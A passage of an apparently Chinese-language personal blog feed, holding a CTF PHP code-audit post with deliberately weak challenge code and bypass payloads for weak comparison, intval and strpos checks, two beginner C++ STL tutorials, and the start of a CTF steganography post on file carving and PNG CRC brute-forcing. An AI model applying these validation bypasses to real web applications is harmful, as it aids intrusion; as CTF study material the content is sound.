class="hljs-keyword">include</span>(<span class="hljs-string">&quot;test.php&quot;</span>);<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;paraml&#x27;</span>]))&#123;    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;paraml&#x27;</span>];    <span class="hljs-keyword">switch</span>(<span class="hljs-variable">$a</span>)&#123;        <span class="hljs-keyword">case</span> <span class="hljs-variable">$a</span>&gt;=<span class="hljs-number">0</span>:            <span class="hljs-keyword">echo</span> <span class="hljs-number">0</span>;            <span class="hljs-keyword">break</span>;        <span class="hljs-keyword">case</span> <span class="hljs-variable">$a</span>&gt;=<span class="hljs-number">10</span>:            <span class="hljs-keyword">echo</span> FLAG;            <span class="hljs-keyword">break</span>;        <span class="hljs-keyword">default</span>:            <span class="hljs-keyword">echo</span> <span class="hljs-number">2</span>;            <span class="hljs-keyword">break</span>;    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>payload:</p><div class="code-wrapper"><pre><code class="hljs routeros">?<span class="hljs-attribute">paraml</span>=0</code></pre></div><p>首先传进去 a &#x3D; 0;</p><ol><li>进入第一个case  : 判断 0&gt;&#x3D;0 结果为true，接着判断 0 &#x3D;&#x3D; true ，结果是false;</li><li>进入第二个case  ：判断 0&gt;&#x3D;10 结果是false，接着判断 0 &#x3D;&#x3D; false 结果是true;</li><li>输出flag;</li></ol><h2 id="intval-函数"><a href="#intval-函数" class="headerlink" title="intval 函数"></a>intval 函数</h2><p><em>注：漏洞只存在于某些版本的php中</em></p><p>intval 用于获取变量的整数值</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-number">53</span>)  <span class="hljs-comment">// 53</span><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-number">5.3</span>) <span class="hljs-comment">// 5</span></code></pre></div><p>函数使用方法：</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">int</span> <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-keyword">var</span>,base)<span class="hljs-comment">/*</span><span class="hljs-comment">var 是要转换成 integer 的数量值，base只转化所用的进制</span><span class="hljs-comment">如果base是0，通过检测 var 的格式来决定所使用的进制</span><span class="hljs-comment">0x -&gt; 16进制</span><span class="hljs-comment">0 -&gt; 8进制</span><span class="hljs-comment">否则使用10 进制</span><span class="hljs-comment">*/</span></code></pre></div><p>成功时返回 var 的 integer 值，失败时返回 0； </p><p>空的 array 返回0 ，非空的 array 返回 0；</p><p>如果是一个弱比较 a &#x3D;&#x3D; b  ，我们传入 a[]&#x3D;1和b[]&#x3D;2</p><p>某些版本的php对科学计数法中的e不敏感</p><h4 id="案例1："><a href="#案例1：" class="headerlink" title="案例1："></a>案例1：</h4><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;test.php&#x27;</span>);<span class="hljs-variable">$s</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$s</span>) &lt; <span class="hljs-number">666</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$s</span>+<span class="hljs-number">1</span>) &gt; <span class="hljs-number">667</span>)&#123;    <span class="hljs-keyword">echo</span> FLAG;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>payload:</p><div class="code-wrapper"><pre><code class="hljs ruby"><span class="hljs-string">?a</span> = <span class="hljs-number">1e10</span></code></pre></div><h4 id="案例2："><a href="#案例2：" class="headerlink" title="案例2："></a>案例2：</h4><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>===<span class="hljs-string">&quot;6666&quot;</span>)&#123;          <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);    &#125;    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)===<span class="hljs-number">6666</span>)&#123;         <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>);    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>解析： 函数格式 <code>intval($value,$base)</code></p><p>当 <code>$base</code> 的值为0 时，函数会检测 $value 的格式来决定使用的进制</p><p>payload：</p><p><code>/?num=0x1a0a</code></p><h2 id="strpos-函数"><a href="#strpos-函数" class="headerlink" title="strpos 函数"></a>strpos 函数</h2><p>strpos 函数查找字符串在另一个字符串中出现的位置并返回</p><h4 id="案例："><a href="#案例：" class="headerlink" title="案例："></a>案例：</h4><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>===<span class="hljs-string">&quot;6666&quot;</span>)&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);    &#125;    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]/i&quot;</span>, <span class="hljs-variable">$num</span>))&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);    &#125;    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$num</span>, <span class="hljs-string">&quot;0&quot;</span>))&#123;           <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);    &#125;    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)===<span class="hljs-number">6666</span>)&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>解析： preg_match 函数过滤了26的英文字母（包括大小写）</p><p>所以通过16进制来获取flag的方法是不可取的，可以考虑使用8进制来绕过，6666的八进制为 15012 在前面加上0 表示 8进制</p><p>所以传入 <code>015012</code></p><p>会发现还是不行，这是因为 第三条 if函数 控制了第一个传入的字符不能为 0 所以被ban掉了</p><p>可以尝试在传参前面加上一个空格</p><p>payload:</p><p><code>num= 05012</code></p><h2 id="in-array-array-search-函数"><a href="#in-array-array-search-函数" class="headerlink" title="in_array  || array_search 函数"></a>in_array  || array_search 函数</h2><blockquote><p>array_search 函数用于搜索指定的值，如果找到就返回这个值的键值，否则返回 false</p></blockquote><p>用法：array_search(value,array,strict)</p><ul><li>value 为要搜索的值</li><li>array 为目标数组</li><li>strict  可选参数<ul><li>true 检查数据类型</li><li>false 默认  不检查数据类型</li></ul></li></ul><h2 id="ereg-函数"><a href="#ereg-函数" class="headerlink" title="ereg 函数"></a>ereg 函数</h2><blockquote><p>在字符串中搜索由模式指定的字符串，如果找到模式，则返回 true，否则返回 false，区分大小写，在 PHP 5.3.0 版本中已经废弃</p></blockquote><p>只能处理字符串，遇到数组会返回 null</p><p>遇到 %00 截止。</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>PHP</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>STL库（一）--Vector</title>
    <link href="/STL%E5%BA%93%EF%BC%88%E4%B8%80%EF%BC%89-Vector/"/>
    <url>/STL%E5%BA%93%EF%BC%88%E4%B8%80%EF%BC%89-Vector/</url>
    
    <content type="html"><![CDATA[<h2 id="Vector（动态数组）"><a href="#Vector（动态数组）" class="headerlink" title="Vector（动态数组）"></a>Vector（动态数组）</h2><h4 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h4><div class="code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;vector&gt;</span></span></code></pre></div><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><ol><li>定义一个vector  未初始化 输出 0</li></ol><div class="code-wrapper"><pre><code class="hljs c++">vector&lt;<span class="hljs-type">int</span>&gt; a;</code></pre></div><ol start="2"><li>定义一个长度为3 的vector 未初始化 输出 0</li></ol><div class="code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">a</span><span class="hljs-params">(<span class="hljs-number">3</span>)</span></span>;</code></pre></div><ol start="3"><li>定义一个长度为10 的vector 每个数赋值为 3</li></ol><div class="code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">a</span><span class="hljs-params">(<span class="hljs-number">10</span>,<span class="hljs-number">3</span>)</span></span>;</code></pre></div><ol start="4"><li>将向量b中从下标 0 1 2（共三个）的元素赋值给a ，a 的类型为int型</li></ol><div class="code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">a</span><span class="hljs-params">(b.begin(),b.begin<span class="hljs-number">+3</span>)</span></span>;</code></pre></div><ol start="5"><li>从数组中获得初始值</li></ol><div class="code-wrapper"><pre><code class="hljs c++"><span class="hljs-type">int</span> b[<span class="hljs-number">7</span>] = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>&#125;vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-built_in">a</span>(b,b<span class="hljs-number">+7</span>);</code></pre></div><ol start="6"><li>输出</li></ol><div class="code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> x:a)&#123;cout &lt;&lt; x &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;&#125;</code></pre></div><h3 id="size"><a href="#size" class="headerlink" title="size()"></a>size()</h3><div class="code-wrapper"><pre><code class="hljs c++">a.<span class="hljs-built_in">size</span>()    <span class="hljs-comment">// 返回元素个数</span></code></pre></div><h3 id="resize"><a href="#resize" class="headerlink" title="resize()"></a>resize()</h3><div class="code-wrapper"><pre><code class="hljs c++">a.<span class="hljs-built_in">resize</span>()    <span class="hljs-comment">// 改变大小</span></code></pre></div><h3 id="empty"><a href="#empty" class="headerlink" title="empty()"></a>empty()</h3><div class="code-wrapper"><pre><code class="hljs c++">a.<span class="hljs-built_in">empty</span>();    <span class="hljs-comment">// 判断a是否为空，空则返回true，非空则返回false</span></code></pre></div><h3 id="front-和-back"><a href="#front-和-back" class="headerlink" title="front() 和 back()"></a>front() 和 back()</h3><div class="code-wrapper"><pre><code class="hljs c++">a.<span class="hljs-built_in">front</span>();<span class="hljs-comment">// 返回a的第一个元素，当且仅当a存在</span>a.<span class="hljs-built_in">back</span>();<span class="hljs-comment">// 返回vector的最后一个数</span></code></pre></div><h3 id="倍增思想"><a href="#倍增思想" class="headerlink" title="倍增思想"></a>倍增思想</h3><p>C++ 系统为某一程序分配空间的所需时间，与空间大小无关，与申请次数有关如果申请一个空间为1000 和 空间 为1 申请1000 次的所需时间差别是很大的，申请次数越多，越耗时间。</p><h3 id="clear"><a href="#clear" class="headerlink" title="clear()"></a>clear()</h3><div class="code-wrapper"><pre><code class="hljs c++">a.<span class="hljs-built_in">clear</span>();<span class="hljs-comment">//清空a中的元素</span></code></pre></div><h3 id="支持比较运算"><a href="#支持比较运算" class="headerlink" title="支持比较运算"></a>支持比较运算</h3><p>比较操作 &#x3D;&#x3D; , !&#x3D; , &lt;  , &gt; , &lt;&#x3D; , &gt;&#x3D; </p><div class="code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-comment">//支持比较运算</span>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">a</span><span class="hljs-params">(<span class="hljs-number">4</span>,<span class="hljs-number">3</span>)</span>,<span class="hljs-title">b</span><span class="hljs-params">(<span class="hljs-number">3</span>,<span class="hljs-number">4</span>)</span></span>;    <span class="hljs-comment">// a: 3 3 3 3  b: 4 4 4 </span>    <span class="hljs-comment">//比较原理   字典序 （根据最前面哪个判断，如果一样就往后比较）</span>    <span class="hljs-keyword">if</span>(a &lt; b)        cout &lt;&lt; <span class="hljs-string">&quot;a &lt; b&quot;</span> &lt;&lt; endl;        &#125;</code></pre></div><h3 id="push-back-和-pop-back"><a href="#push-back-和-pop-back" class="headerlink" title="push_back() 和 pop_back()"></a>push_back() 和 pop_back()</h3><div class="code-wrapper"><pre><code class="hljs c++">a.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">5</span>);<span class="hljs-comment">// 在a的最后一个向量后插入一个元素，其值为5</span>a.<span class="hljs-built_in">pop_back</span>();<span class="hljs-comment">//删除a向量的最后一个元素</span></code></pre></div><h3 id="begin-和end"><a href="#begin-和end" class="headerlink" title="begin()和end()"></a>begin()和end()</h3><div class="code-wrapper"><pre><code class="hljs c++">a.<span class="hljs-built_in">begin</span>();  <span class="hljs-comment">// vector的第0个数；</span>a.<span class="hljs-built_in">end</span>(); <span class="hljs-comment">// vector的最后一个数的后面一个数</span>通常与<span class="hljs-keyword">for</span>循环结合使用</code></pre></div><h3 id="遍历vector的三种方法"><a href="#遍历vector的三种方法" class="headerlink" title="遍历vector的三种方法"></a>遍历vector的三种方法</h3><div class="code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">nt <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    vector&lt;<span class="hljs-type">int</span>&gt; a;    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++)    &#123;        a.<span class="hljs-built_in">push_back</span>(i);    &#125;    <span class="hljs-comment">// 三种遍历vector的方法</span>    <span class="hljs-comment">//第一种</span>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;a.<span class="hljs-built_in">size</span>();i++)    &#123;        cout &lt;&lt; a[i] &lt;&lt; <span class="hljs-string">&quot; &quot;</span> ;    &#125;    cout &lt;&lt; endl;    <span class="hljs-comment">// 第二种</span>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> i=a.<span class="hljs-built_in">begin</span>();i!= a.<span class="hljs-built_in">end</span>();i++)    &#123;        cout &lt;&lt; *i &lt;&lt; <span class="hljs-string">&#x27; &#x27;</span>;    &#125;    cout &lt;&lt; endl;    <span class="hljs-comment">// 第三种    C++11 新语法</span>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> x:a)    &#123;        cour &lt;&lt; x &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;    &#125;    cout &lt;&lt; endl;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><h3 id="结合算法erase-reverse"><a href="#结合算法erase-reverse" class="headerlink" title="结合算法erase() reverse()"></a>结合算法erase() reverse()</h3><div class="code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;vector&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    a.<span class="hljs-built_in">erase</span>(b);  <span class="hljs-comment">//从a中删除迭代器p指定的元素，p必须只想c中的一个真实元素，不能是最后一个元素 end()</span>    a.<span class="hljs-built_in">erase</span>(b,e); <span class="hljs-comment">// 从a中删除迭代器对b和e所表示的范围中的元素，返回e</span>        vector&lt;<span class="hljs-type">int</span>&gt; a=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>&#125;;    <span class="hljs-built_in">reverse</span>(a.<span class="hljs-built_in">begin</span>(),a.<span class="hljs-built_in">end</span>()); <span class="hljs-comment">//a的值为 5,4,3,2,1 倒置</span>        &#125;</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>C++</tag>
      
      <tag>STL</tag>
      
      <tag>算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>STL库（二）--Pair[x,y]</title>
    <link href="/STL%E5%BA%93%EF%BC%88%E4%BA%8C%EF%BC%89-Pair-x-y/"/>
    <url>/STL%E5%BA%93%EF%BC%88%E4%BA%8C%EF%BC%89-Pair-x-y/</url>
    
    <content type="html"><![CDATA[<h2 id="Pair-x-y"><a href="#Pair-x-y" class="headerlink" title="Pair[x,y]"></a>Pair[x,y]</h2><div class="code-wrapper"><pre><code class="hljs cpp">可以理解为（x,y）数学中的坐标表示小技巧：使用<span class="hljs-keyword">typedef</span>定义 <span class="hljs-keyword">typedef</span> pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt; PII</code></pre></div><h3 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h3><div class="code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;utility&gt;</span></span></code></pre></div><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><div class="code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// 两种方法初始化</span><span class="hljs-function">pair&lt;string,<span class="hljs-type">int</span>&gt; <span class="hljs-title">p</span><span class="hljs-params">(<span class="hljs-string">&quot;hello&quot;</span>,<span class="hljs-number">1</span>)</span></span>;p = <span class="hljs-built_in">make_pair</span>(<span class="hljs-string">&quot;hello&quot;</span>,<span class="hljs-number">1</span>);</code></pre></div><h3 id="first-和-second"><a href="#first-和-second" class="headerlink" title="first() 和 second()"></a>first() 和 second()</h3><div class="code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">p</span>(<span class="hljs-string">&quot;hello&quot;</span>,<span class="hljs-number">1</span>);p.first; <span class="hljs-comment">//第一个元素 = hello;</span>p.second; <span class="hljs-comment">// 第二个元素 = 1;</span></code></pre></div><h3 id="嵌套（套娃）"><a href="#嵌套（套娃）" class="headerlink" title="嵌套（套娃）"></a>嵌套（套娃）</h3><div class="code-wrapper"><pre><code class="hljs c++">vector&lt;vector&lt;pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;&gt;&gt;  <span class="hljs-comment">//与vector结合再写个vector结合即可</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//套娃操作 用pair 存储3个数据</span>pair&lt;<span class="hljs-type">int</span>,pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">p</span>(<span class="hljs-number">1</span>,&#123;<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;);</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>C++</tag>
      
      <tag>STL</tag>
      
      <tag>算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF-MISC杂项</title>
    <link href="/CTF-MISC%E6%9D%82%E9%A1%B9/"/>
    <url>/CTF-MISC%E6%9D%82%E9%A1%B9/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="MISC-杂项"><a href="#MISC-杂项" class="headerlink" title="MISC 杂项"></a>MISC 杂项</h1><h2 id="文件的操作"><a href="#文件的操作" class="headerlink" title="文件的操作"></a>文件的操作</h2><h3 id="文件类型识别"><a href="#文件类型识别" class="headerlink" title="文件类型识别"></a>文件类型识别</h3><ol><li>file 命令使用场景：不知道文件名，无法打开文件</li><li>winhex          使用场景：windows下通过文件头信息判断文件类型</li></ol><p>常见文件头、文件尾</p><table><thead><tr><th>文件格式</th><th>文件头</th><th>文件尾</th></tr></thead><tbody><tr><td>JPEG (jpg)文件头</td><td>FFD8FF</td><td>FF D9</td></tr><tr><td>PNG (png)文件头</td><td>89504E47</td><td>AE 42 60 82</td></tr><tr><td>GIF (gif) 文件头</td><td>47494638</td><td>00 3B</td></tr><tr><td>TIFF (tif)文件头</td><td>49492A00</td><td></td></tr><tr><td>XML (xml)文件头</td><td>3C3F786D6C</td><td></td></tr><tr><td>HTML (html)文件头</td><td>68746D6C3E</td><td></td></tr><tr><td>Adobe Acrobat (pdf)文件头</td><td>255044462D312E</td><td></td></tr><tr><td>ZIP Archive (zip)文件头</td><td>504B0304</td><td>504B</td></tr><tr><td>TAR （tar.gz）文件头</td><td>1F8B0800</td><td></td></tr><tr><td>RAR Archive (rar)文件头</td><td>526172211A0700 C43D7B00400700</td><td>C43D7B00400700</td></tr><tr><td>Wave (wav)文件头</td><td>57415645</td><td></td></tr><tr><td>AVI (avi)，文件头</td><td>41564920</td><td></td></tr><tr><td>MS Word&#x2F;Excel (xls.or.doc)文件头</td><td>D0CF11E0</td><td></td></tr><tr><td>Adobe Photoshop (psd)文件头</td><td>38425053</td><td></td></tr><tr><td>Windows Bitmap (bmp) 文件头</td><td>424D</td><td></td></tr></tbody></table><h3 id="文件分离"><a href="#文件分离" class="headerlink" title="文件分离"></a>文件分离</h3><ol><li>binwalk  工具</li></ol><p>用法：</p><ul><li>分析文件</li></ul><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> binwalk filename</code></pre></div><ul><li>分离文件</li></ul><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> binwalk -e filename</code></pre></div><ol><li>foremost 工具</li></ol><p>如果 binwalk 无法正确 分离出文件，可以使用该工具</p><p>用法：</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> foremost 文件名 -o 输出文件夹</code></pre></div><ol><li>dd</li></ol><p>当文件自动分离出错或者因为其他原因无法自动分离时，可以使用 dd 实现文件手动分离</p><p>用法：</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=源文件 of=目标文件名 bs=1 skip=开始分离的字节数</code></pre></div><p>参数说明：</p><div class="code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">if</span>=file <span class="hljs-comment">#输入文件名，缺省为标准输入</span><span class="hljs-attr">of</span>=file <span class="hljs-comment">#输出文件名，缺省为标准输入</span><span class="hljs-attr">bs</span>=bytes<span class="hljs-comment">#同时设置读写块的大小为bytes，可代替ibs和obs</span><span class="hljs-attr">skip</span>=blocks<span class="hljs-comment">#从输入文件开头跳过blocks个块后再开始复制</span></code></pre></div><p><strong>方法二：可以尝试修改后缀名，但当隐藏了多种格式时可能会失败</strong></p><h3 id="文件合并"><a href="#文件合并" class="headerlink" title="文件合并"></a>文件合并</h3><ol><li>Linux 下的文件合并</li></ol><p>使用场景：linux 下，通常对文件名相似的文件要进行批量合并</p><p>格式：</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> 文件名1 文件名2 文件名3 &gt; 输出的文件</code></pre></div><p>完整性检测：</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">md5sum</span> 文件名</code></pre></div><ol start="2"><li>windows 下的文件合并</li></ol><p>使用场景：windows 下，通常要对文件名相似的文件进行批量合并</p><p>格式：</p><div class="code-wrapper"><pre><code class="hljs bash">copy /B 合并的文件 输出的文件命令</code></pre></div><p>完整性检测：</p><div class="code-wrapper"><pre><code class="hljs bash">certutil -hashfile 文件名 md5</code></pre></div><h2 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h2><h3 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h3><p>​首先使用 16进制编辑器 查看文件 或者使用 binwalk  有时 flag 会直接写在 里面</p><h3 id="LSB-隐写"><a href="#LSB-隐写" class="headerlink" title="LSB 隐写"></a>LSB 隐写</h3><ol><li>zsteg 工具</li></ol><p>安装：（Kali linux）</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install gem</code></pre></div><div class="code-wrapper"><pre><code class="hljs bash">gem install zsteg</code></pre></div><p>使用：</p><div class="code-wrapper"><pre><code class="hljs bash">zsteg xxxx.jpg</code></pre></div><div class="code-wrapper"><pre><code class="hljs bash">zsteg -E <span class="hljs-string">&quot;b1,rgb,lsb,xy&quot;</span> 42011487927629132.png &gt; 123.zip</code></pre></div><ol start="2"><li>wbstego4 工具</li></ol><p>解密通过 lsb 加密的图片，bmp格式</p><p><img src="/CTF-MISC%E6%9D%82%E9%A1%B9/1.png"></p><ol start="3"><li>stegsolve</li></ol><p><img src="/CTF-MISC%E6%9D%82%E9%A1%B9/aaaaa.png"></p><h3 id="PNG-图片宽高"><a href="#PNG-图片宽高" class="headerlink" title="PNG 图片宽高"></a>PNG 图片宽高</h3><p>图片 CRC 计算</p><p>TweakPNG</p><p><img src="/CTF-MISC%E6%9D%82%E9%A1%B9/2.png"></p><p><img src="/CTF-MISC%E6%9D%82%E9%A1%B9/32.png"></p><p>python -&gt; 计算文件宽高 </p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zlib<span class="hljs-keyword">import</span> struct<span class="hljs-keyword">import</span> argparse<span class="hljs-keyword">import</span> itertoolsparser = argparse.ArgumentParser()parser.add_argument(<span class="hljs-string">&quot;-f&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>, default=<span class="hljs-literal">None</span>, required=<span class="hljs-literal">True</span>,                 <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;输入同级目录下图片的名称&quot;</span>)args  = parser.parse_args()bin_data = <span class="hljs-built_in">open</span>(args.f, <span class="hljs-string">&#x27;rb&#x27;</span>).read()crc32key = zlib.crc32(bin_data[<span class="hljs-number">12</span>:<span class="hljs-number">29</span>]) <span class="hljs-comment"># 计算crc</span>original_crc32 = <span class="hljs-built_in">int</span>(bin_data[<span class="hljs-number">29</span>:<span class="hljs-number">33</span>].<span class="hljs-built_in">hex</span>(), <span class="hljs-number">16</span>) <span class="hljs-comment"># 原始crc</span><span class="hljs-keyword">if</span> crc32key == original_crc32: <span class="hljs-comment"># 计算crc对比原始crc</span>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;宽高没有问题!&#x27;</span>)<span class="hljs-keyword">else</span>:    input_ = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;宽高被改了, 是否CRC爆破宽高? (Y/n):&quot;</span>)    <span class="hljs-keyword">if</span> input_ <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> [<span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-string">&quot;&quot;</span>]:        exit()    <span class="hljs-keyword">else</span>:         <span class="hljs-keyword">for</span> i, j <span class="hljs-keyword">in</span> itertools.product(<span class="hljs-built_in">range</span>(<span class="hljs-number">4095</span>), <span class="hljs-built_in">range</span>(<span class="hljs-number">4095</span>)): <span class="hljs-comment"># 理论上0x FF FF FF FF，但考虑到屏幕实际/cpu，0x 0F FF就差不多了，也就是4095宽度和高度</span>            data = bin_data[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>] + struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, i) + struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, j) + bin_data[<span class="hljs-number">24</span>:<span class="hljs-number">29</span>]            crc32 = zlib.crc32(data)            <span class="hljs-keyword">if</span>(crc32 == original_crc32): <span class="hljs-comment"># 计算当图片大小为i:j时的CRC校验值，与图片中的CRC比较，当相同，则图片大小已经确定</span>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\nCRC32: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(original_crc32)&#125;</span>&quot;</span>)                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;宽度: <span class="hljs-subst">&#123;i&#125;</span>, hex: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(i)&#125;</span>&quot;</span>)                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;高度: <span class="hljs-subst">&#123;j&#125;</span>, hex: <span 